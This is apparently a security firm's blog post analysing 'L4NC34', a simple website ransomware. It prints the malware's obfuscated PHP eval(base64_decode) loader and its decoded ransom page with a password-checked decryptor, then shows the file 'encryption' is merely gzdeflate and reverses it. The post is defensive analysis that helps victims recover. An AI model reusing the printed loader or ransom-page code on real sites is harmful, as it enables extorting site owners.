@@ -1,0 +1,128 @@
+Analyzing & Decrypting L4NC34’s Simple Ransomware
+
+We’re constantly seeing news about computers being infected by ransomware, but very little do we hear about it affecting websites. That being said, the impact can be serious if the affected website is the webmaster’s only source of income or a business relies entirely on it’s website and online presence.
+When the word ransomware is mentioned, the first thing that typically comes to mind is files which have been encrypted in a super-complex way, along with a ransom note asking for hundreds to thousands of dollars worth of cryptocurrency.
+Normally this is kinda the truth — but attackers aren’t all the same, and not all may have the technical expertise or will to go to such lengths.
+L4NC34 Ransomware: The $10 Request
+We recently came across a case where all of the website files were seemingly encrypted and had their file names changed to append a “.crypt”.
+Among the files we also found the ransom note you might typically find in this type of malware, but this one was a bit unusual — It wasn’t an HTML or a .txt file. Instead, the ransom note was actually located within a PHP file and seemed to contain actual functions. Let’s take a closer look at the file.
+Only asking for $10? Discount hacker — or just wants the best chances to get paid?
+Here is the code of the malicious PHP file:
+<?php eval('?>'.base64_decode('PHRpdGxlPkw0TkMzNCBSYW5zb213YXJlPC90aXRsZT4KPGx[pbmsgcmVj[REDACTED BASE64 CODE]dCBNYWlsIDogbDRuYzM0MEBnbWFpbC5jb20=').'<?php '); ?>
+
+Base64 Encoded PHP
+At first glance, nothing looks particularly surprising here. Since it’s a simple base64 encoding, let’s go ahead and decode it. This is a pretty straightforward process — if you read through the Down the Malware Rabbit Hole series, you should be able to decode this without a problem.
+Here is the decoded result:
+<title>L4NC34 Ransomware</title>
+<link rel="shortcut icon" type="image/x-icon" href="https://img.deusm.com/darkreading/bh-asia-facebook-profile.png">
+<style>
+html {
+background: black;
+color: white;
+}
+input { background: transparent; color: white; border: 1px solid white; }
+</style>
+<?php
+error_reporting(0);
+$input = $_POST['pass'];
+$pass = "9c6679accb84e3ef938b1f4c24158355";
+if(isset($input)) {
+if(md5($input) == $pass) {
+function decfile($filename){
+if (strpos($filename, '.crypt') === FALSE) {
+return;
+}
+$decrypted = gzinflate(file_get_contents($filename));
+file_put_contents(str_replace('.crypt', '', $filename), $decrypted);
+unlink('crypt.php');
+unlink('.htaccess');
+unlink($filename);
+echo "$filename Decrypted !!!<br>";
+}
+
+function decdir($dir){
+$files = array_diff(scandir($dir), array('.', '..'));
+foreach($files as $file) {
+if(is_dir($dir."/".$file)){
+decdir($dir."/".$file);
+}else {
+decfile($dir."/".$file);
+}
+}
+}
+
+decdir($_SERVER['DOCUMENT_ROOT']);
+echo "<br>Webroot Decrypted<br>";
+unlink($_SERVER['PHP_SELF']);
+unlink('.htaccess');
+copy('htabackup','.htaccess');
+echo 'Success !!!';
+} else {
+echo 'Failed Password !!!';
+}
+exit();
+}
+?>
+<center>
+<font face='Iceland' color='white' font size="20">L4NC34 ransomware</font><br>
+<img height="200" src="https://i.imgur.com/LGis5gn.jpg"/>
+<br><br>
+<h3>Your Website Is Encrypted</h3>
+
+Don't Change the Filename because it Can Damage the File If You Want to Return You Must Enter the Password First
+<br>
+Send Me $10 For Back Your Website <br><br>
+Bitcoin Address : <input type="text" value="3NcjWKJvc8Siw4ziho87vgmx9RYBNyyRSK" readonly>
+<br><br>
+<form enctype="multipart/form-data" method="post">
+<input type="text" name="pass" placeholder="Password"> <input type="submit" value="Decrypt">
+</form>
+<br>Contact Mail : l4nc340@gmail.com
+
+We can quickly spot the portions of code responsible for displaying the ransom note, along with the actual decryption process for the files.
+As is usual for these types of workflows, the decrypted PHP file requires an external input — such as the encryption key — to properly decrypt the files.
+Password Verification & File Decryption
+This code contains a few specific characteristics that are worth noting.
+$input = $_POST['pass'];
+$pass = "9c6679accb84e3ef938b1f4c24158355";
+if(isset($input)) {
+if(md5($input) == $pass) {
+
+This snippet verifies if the password inputted on the page matches the hardcoded md5 hash. That seems a bit strange; one might expect that the supposed key was not hardcoded — but if this is the case, then there may be a reason for all of these seemingly encrypted files.
+This next bit is responsible for the ransomware’s file decryption function:
+function decfile($filename){
+if (strpos($filename, '.crypt') === FALSE) {
+return;
+}
+$decrypted = gzinflate(file_get_contents($filename));
+file_put_contents(str_replace('.crypt', '', $filename), $decrypted);
+unlink('crypt.php');
+unlink('.htaccess');
+unlink($filename);
+echo "$filename Decrypted !!!<br>";
+}
+
+There really isn’t anything special or very complex about it. The decryption process just seems to take into account the actual contents of the file and then gzinflate them.
+From what we see here, it’s safe to assume that the only way this hacker “encrypted” the files was to gzdeflate the files and change their file name. So, let’s give that a try shall we?
+Encryption with Gzdeflate
+Here’s what one of the encrypted files looked like:
+
+Let’s go back to the original ransom note/script and modify it to execute the decryption function without affecting anything else:
+
+Now we can go ahead and run it either through terminal or through the browser directly. Let’s go ahead and run it through the terminal with the following command:
+$php ransom.php
+
+<br>Webroot Decrypted<br>
+
+Success !!!
+We can now see the decrypted contents of the previous file, which look as expected.
+
+Thankfully, the ransomware encryption was easily and quickly reverted without paying the $10 fee.
+Investigating Bitcoin Wallet Transactions
+One question still remained on my mind, though. Since it’s so easy to reverse this infection, did someone ever even end up paying the attacker? Well, we have their bitcoin wallet address — let’s take a look.
+
+It seems there were no transactions on this wallet. Hopefully that means that none of the infected websites ended up paying the ransom and were able to revert the malicious file without issues.
+Conclusion
+Despite being affected by ransomware, this particular was not the end of the world and was easily fixed in no time. That being said, ransomware attacks have very serious implications. In the US alone, potential costs exceeded $7.5 billion In 2019. And much like other ransom involved crimes, there’s no guarantee that paying a ransom will end in a positive result.
+As days pass, I suspect security companies will continue to increase their knowledge of ransomware and decryption methods to help websites, corporations, and the many other people affected by this type of malware.
+If you believe your website has been distributing ransomware and need a hand cleaning it up, we’re here to help.
